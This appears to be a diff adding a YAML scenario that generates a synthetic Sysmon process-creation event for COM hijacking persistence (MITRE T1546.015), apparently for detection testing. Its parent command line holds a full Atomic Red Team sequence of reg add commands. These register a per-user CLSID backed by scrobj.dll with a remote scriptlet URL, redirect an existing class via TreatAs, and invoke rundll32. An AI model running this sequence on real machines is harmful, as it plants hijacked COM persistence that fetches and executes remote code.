@@ -1,0 +1,112 @@
+type: scenario
+description: |
+  A per-user COM class is registered with scrobj.dll as its in-process
+  server. Sysmon EID 1 (Process Create) records powershell.exe starting
+  reg.exe to add the default value of an InprocServer32 key under
+  HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID with the data
+  C:\WINDOWS\system32\scrobj.dll, the Windows Script Component runtime.
+  The event records the reg.exe command, not whether the class is later
+  loaded.
+tags: [eid1]
+mitre:
+  tactics: [persistence, privilege-escalation]
+  techniques: [T1546.015]
+
+state:
+  domain_short:        CORP
+  domain_tld:          local
+  domain_short_lower:  fn.lower(ref.domain_short)
+  domain_fqdn:         "${ref.domain_short_lower}.${ref.domain_tld}"
+  computer:            gen.hostname(class=windows-workstation, domain=ref.domain_fqdn)
+  sysmon_pid:          gen.int(min=1000, max=4000)
+  sysmon_tid:          gen.int(min=1000, max=9999)
+  event_record_id:     gen.int(min=5000, max=9999999)
+  user_name:           gen.username()
+  user:                "${ref.domain_short}\\${ref.user_name}"
+  current_directory:   'C:\Users\${ref.user_name}\AppData\Local\Temp\'
+  logon_guid_raw:      fn.upper(gen.uuid())
+  logon_guid:          "{${ref.logon_guid_raw}}"
+  logon_id_hex:        gen.hex(len=6, case=lower)
+  logon_id:            "0x${ref.logon_id_hex}"
+  terminal_session_id: 2
+  integrity_level:     High
+  process_guid_raw:    fn.upper(gen.uuid())
+  process_guid:        "{${ref.process_guid_raw}}"
+  process_id:          gen.int(min=1000, max=9999)
+  parent_guid_raw:     fn.upper(gen.uuid())
+  parent_process_guid: "{${ref.parent_guid_raw}}"
+  parent_process_id:   gen.int(min=1000, max=9999)
+  command_line:        '"C:\Windows\system32\reg.exe" add HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32 /ve /T REG_SZ /d C:\WINDOWS\system32\scrobj.dll /f'
+  parent_command_line: "\"powershell.exe\" & {reg add \\\"\"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\AtomicTest\\\"\" /ve /T REG_SZ /d \\\"\"AtomicTest\\\"\" /f\nreg add \\\"\"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\AtomicTest.1.00\\\"\" /ve /T REG_SZ /d \\\"\"AtomicTest\\\"\" /f\nreg add \\\"\"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\AtomicTest\\CLSID\\\"\" /ve /T REG_SZ /d \\\"\"{00000001-0000-0000-0000-0000FEEDACDC}\\\"\" /f\nreg add \\\"\"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\AtomicTest.1.00\\CLSID\\\"\" /ve /T REG_SZ /d \\\"\"{00000001-0000-0000-0000-0000FEEDACDC}\\\"\" /f\nreg add \\\"\"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\\"\" /f\nreg add \\\"\"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\\"\" /ve /T REG_SZ /d \\\"\"AtomicTest\\\"\" /f\nreg add \\\"\"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\InprocServer32\\\"\" /ve /T REG_SZ /d \\\"\"C:\\WINDOWS\\system32\\scrobj.dll\\\"\" /f\nreg add \\\"\"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\InprocServer32\\\"\" /v \\\"\"ThreadingModel\\\"\" /T REG_SZ /d \\\"\"Apartment\\\"\" /f\nreg add \\\"\"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\ProgID\\\"\" /ve /T REG_SZ /d \\\"\"AtomicTest\\\"\" /f\nreg add \\\"\"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\ScriptletURL\\\"\" /ve /T REG_SZ /d \\\"\"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/src/TreatAs.sct\\\"\" /f\nreg add \\\"\"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\VersionIndependentProgID\\\"\" /ve /T REG_SZ /d \\\"\"AtomicTest\\\"\" /f\n\nreg add \\\"\"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\\\"\" /f\nreg add \\\"\"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\\TreatAs\\\"\" /ve /T REG_SZ /d \\\"\"{00000001-0000-0000-0000-0000FEEDACDC}\\\"\" /f\n\nrundll32.exe -sta \\\"\"AtomicTest\\\"\"}"
+
+steps:
+  - emit:
+      event_type: windows.wineventlog@v1
+      fields:
+        System:
+          Provider:
+            "@Name": Microsoft-Windows-Sysmon
+            "@Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"
+          EventID: 1
+          Version: 5
+          Level: 4
+          Task: 1
+          Opcode: 0
+          Keywords: "0x8000000000000000"
+          TimeCreated:
+            "@SystemTime": gen.timestamp(format=wineventlog)
+          EventRecordID: ref.event_record_id
+          Correlation: {}
+          Execution:
+            "@ProcessID": ref.sysmon_pid
+            "@ThreadID": ref.sysmon_tid
+          Channel: Microsoft-Windows-Sysmon/Operational
+          Computer: ref.computer
+          Security:
+            "@UserID": S-1-5-18
+        EventData:
+          Data:
+            - "@Name": RuleName
+              "#text": "-"
+            - "@Name": UtcTime
+              "#text": gen.timestamp(format=sysmon)
+            - "@Name": ProcessGuid
+              "#text": ref.process_guid
+            - "@Name": ProcessId
+              "#text": ref.process_id
+            - "@Name": Image
+              "#text": 'C:\Windows\System32\reg.exe'
+            - "@Name": FileVersion
+              "#text": "10.0.14393.0 (rs1_release.160715-1616)"
+            - "@Name": Description
+              "#text": Registry Console Tool
+            - "@Name": Product
+              "#text": "Microsoft® Windows® Operating System"
+            - "@Name": Company
+              "#text": Microsoft Corporation
+            - "@Name": OriginalFileName
+              "#text": reg.exe
+            - "@Name": CommandLine
+              "#text": ref.command_line
+            - "@Name": CurrentDirectory
+              "#text": ref.current_directory
+            - "@Name": User
+              "#text": ref.user
+            - "@Name": LogonGuid
+              "#text": ref.logon_guid
+            - "@Name": LogonId
+              "#text": ref.logon_id
+            - "@Name": TerminalSessionId
+              "#text": ref.terminal_session_id
+            - "@Name": IntegrityLevel
+              "#text": ref.integrity_level
+            - "@Name": Hashes
+              "#text": "MD5=59A22FA6CF85026BB6BC69A1ADD75C50,SHA256=9E28034CE3AEEA6951F790F8997DF44CFBF80BEFF9FB17413DBA317016A716AD"
+            - "@Name": ParentProcessGuid
+              "#text": ref.parent_process_guid
+            - "@Name": ParentProcessId
+              "#text": ref.parent_process_id
+            - "@Name": ParentImage
+              "#text": 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
+            - "@Name": ParentCommandLine
+              "#text": ref.parent_command_line
